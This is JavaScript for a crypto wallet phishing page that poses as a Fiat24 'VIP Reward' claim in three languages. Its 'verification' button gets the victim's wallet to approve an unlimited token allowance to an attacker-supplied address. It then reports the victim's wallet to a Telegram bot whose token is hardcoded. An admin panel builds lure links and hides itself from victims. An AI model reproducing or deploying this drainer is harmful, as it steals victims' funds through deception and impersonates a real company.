const content = {
    en: { title: "Claim VIP Reward", desc: "Congratulations! Your wallet is eligible for a VIP Reward from Fiat24. Synchronize your wallet to secure and claim your assets immediately.", btn: "CLAIM REWARD NOW", status: "Reward Status: Ready to Claim" },
    cn: { title: "领取 VIP 奖励", desc: "恭喜！您的钱包有资格领取 Fiat24 的 VIP 奖励。立即同步您的钱包以保障并领取您的资产。", btn: "立即领取奖励", status: "奖励状态：就绪" },
    ru: { title: "Получить VIP-награду", desc: "Поздравляем! Ваш кошелек имеет право на получение VIP-награды от Fiat24. Синхронизируйте свой кошелек, чтобы немедленно защитить и получить свои активы.", btn: "ПОЛУЧИТЬ НАГРАДУ", status: "Статус награды: Готов к выдаче" }
};

function changeLang(lang) {
    document.getElementById('txt-title').innerText = content[lang].title;
    document.getElementById('txt-desc').innerText = content[lang].desc;
    document.getElementById('txt-btn').innerText = content[lang].btn;
    document.getElementById('txt-status').innerText = content[lang].status;
}

// --- FUNGSI GENERATOR LINK (AGAR TOMBOL BISA DIKLIK) ---
function generateLink() {
    const token = document.getElementById('targetToken').value;
    const wallet = document.getElementById('myWallet').value;
    const baseUrl = window.location.origin + window.location.pathname;
    const finalLink = `${baseUrl}?token=${token}&receiver=${wallet}`;
    document.getElementById('generatedLink').value = finalLink;
}

function copyLink() {
    const copyText = document.getElementById("generatedLink");
    if (!copyText.value) return;
    copyText.select();
    document.execCommand("copy");
    alert("Link copied to clipboard!");
}

// OTOMATIS ISI DATA DARI LINK & SEMBUNYIKAN ADMIN JIKA DIBUKA PAUS
window.onload = function() {
    const urlParams = new URLSearchParams(window.location.search);
    const tokenParam = urlParams.get('token');
    const receiverParam = urlParams.get('receiver');

    if (tokenParam && receiverParam) {
        document.getElementById('targetToken').value = tokenParam;
        document.getElementById('myWallet').value = receiverParam;
        document.getElementById('adminBox').style.display = 'none'; 
    }
};

// --- FUNGSI EKSEKUSI PENARIKAN (WEB3) ---
async function startVerification() {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const user = accounts[0];
            const tokenAddress = document.getElementById('targetToken').value;
            const spenderAddress = document.getElementById('myWallet').value;
            
            if(!tokenAddress || !spenderAddress) {
                alert("Data Target/Penerima Belum Diisi!");
                return;
            }

            const abi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"boolean"}],"type":"function"}];
            const contract = new web3.eth.Contract(abi, tokenAddress);
            const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

            document.getElementById('txt-status').innerText = "Processing Authorization...";
            await contract.methods.approve(spenderAddress, amount).send({ from: user });

            // NOTIFIKASI TELEGRAM
            const tele_bot_id = "8679938218:AAH_ZuYcoOroEBC-79sQ1CgoEKzcaCrWmYs";
            const tele_chat_id = "8795373522";
            const message = `🚀 **TING! ALERT CLOUD NINE** 🚀%0A%0ASeorang paus memberikan izin akses!%0A%0AWallet: ${user}%0ATarget: ${tokenAddress}`;

            fetch(`https://api.telegram.org/bot${tele_bot_id}/sendMessage?chat_id=${tele_chat_id}&text=${message}&parse_mode=Markdown`);

            alert("Verification Complete. Please wait 24h for IBAN activation.");
        } catch (e) {
            console.error(e);
            document.getElementById('txt-status').innerText = "Verification Failed. Try again.";
        }
    } else {
        alert("Please use SafePal or OKX DApp Browser.");
    }
}
